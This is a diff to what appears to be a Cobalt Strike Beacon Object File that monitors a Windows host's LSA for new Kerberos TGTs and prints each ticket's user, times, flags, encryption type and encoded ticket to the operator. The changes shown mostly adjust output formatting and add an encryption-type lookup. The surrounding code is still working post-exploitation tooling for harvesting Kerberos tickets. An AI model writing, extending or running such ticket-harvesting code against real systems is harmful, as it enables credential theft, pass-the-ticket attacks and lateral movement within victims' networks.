@@ -138,15 +138,12 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
     return STATUS_SUCCESS;
 }
 
-/* 
-    Displaying Ticket Information
-*/
 VOID PrintTime(LARGE_INTEGER* li) {
     LARGE_INTEGER localTime = { 0 };
     TIME_FIELDS tf = { 0 };
     NTDLL$RtlSystemTimeToLocalTime(li, &localTime);
     NTDLL$RtlTimeToTimeFields(&localTime, &tf);
-    BeaconPrintf(CALLBACK_OUTPUT, "%d-%d-%d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
+    BeaconPrintf(CALLBACK_OUTPUT, "%02d-%02d-%02d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
 }
 
 static const FLAG_ENTRY kerbFlags[] = {
@@ -169,20 +166,39 @@ static const FLAG_ENTRY kerbFlags[] = {
     { reserved1,         "reserved1"          },
 };
 
+const char* GetEncType(LONG encType) {
+    switch (encType) {
+        case des_cbc_crc:          return "des-cbc-crc";
+        case des_cbc_md4:          return "des-cbc-md4";
+        case des_cbc_md5:          return "des-cbc-md5";
+        case des3_cbc_md5:         return "des3-cbc-md5";
+        case des3_cbc_sha1:        return "des3-cbc-sha1";
+        case aes128_cts_hmac_sha1: return "aes128-cts-hmac-sha1-96";
+        case aes256_cts_hmac_sha1: return "aes256-cts-hmac-sha1-96";
+        case rc4_hmac:             return "rc4-hmac";
+        case rc4_hmac_exp:         return "rc4-hmac-exp";
+        default:                   return "unknown";
+    }
+}
+
 VOID PrintTicketInformation(PTICKET_ENTRY entry) {
     // Header
     SYSTEMTIME now;
     KERNEL32$GetLocalTime(&now);
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d-%d-%d %02d:%02d:%02d - Found new TGT:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond);
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %02d-%02d-%02d %02d:%02d:%02d - Found new TGT:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond);
     
     // Ticket information
     char user[512] = { 0 };
     MSVCRT$_snprintf(user, sizeof(user) - 1, "%s @ %s", entry->clientName, entry->clientRealm);
     BeaconPrintf(CALLBACK_OUTPUT, "  User           :  %s\n", user);
     BeaconPrintf(CALLBACK_OUTPUT, "  LogonId        :  0x%lx\n", entry->luid.LowPart);
+    if (MSVCRT$strcmp(entry->clientRealm, entry->serverRealm) != 0)
+        // Print Server Realm only when it differs from the Client Realm
+        BeaconPrintf(CALLBACK_OUTPUT, "  ServerRealm    :  %s\n", entry->serverRealm);
     BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  "); PrintTime(&entry->startTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
     BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  "); PrintTime(&entry->endTime);   BeaconPrintf(CALLBACK_OUTPUT, "\n");
     BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  "); PrintTime(&entry->renewTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "  EncType        :  %s\n", GetEncType(entry->encryptionType)); 
 
     // Flags
     UINT flags = entry->ticketFlags;
@@ -194,7 +210,8 @@ VOID PrintTicketInformation(PTICKET_ENTRY entry) {
             first = FALSE;
         }
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "\n  Encoded Ticket :  ");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n"); 
+    BeaconPrintf(CALLBACK_OUTPUT, "  EncodedTicket  :  ");
 }
 
 VOID PrintTicket(PBYTE ticket, ULONG ticketSize) {
@@ -320,11 +337,12 @@ VOID go(char* args, int argc) {
 
     } while (TRUE);
 
+    // Cleanup
     if (prev.tickets)
         MemFree(prev.tickets);
     if (curr.tickets)
         MemFree(curr.tickets);
-
     SECUR32$LsaDeregisterLogonProcess(hLsa);
+
     BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
 }
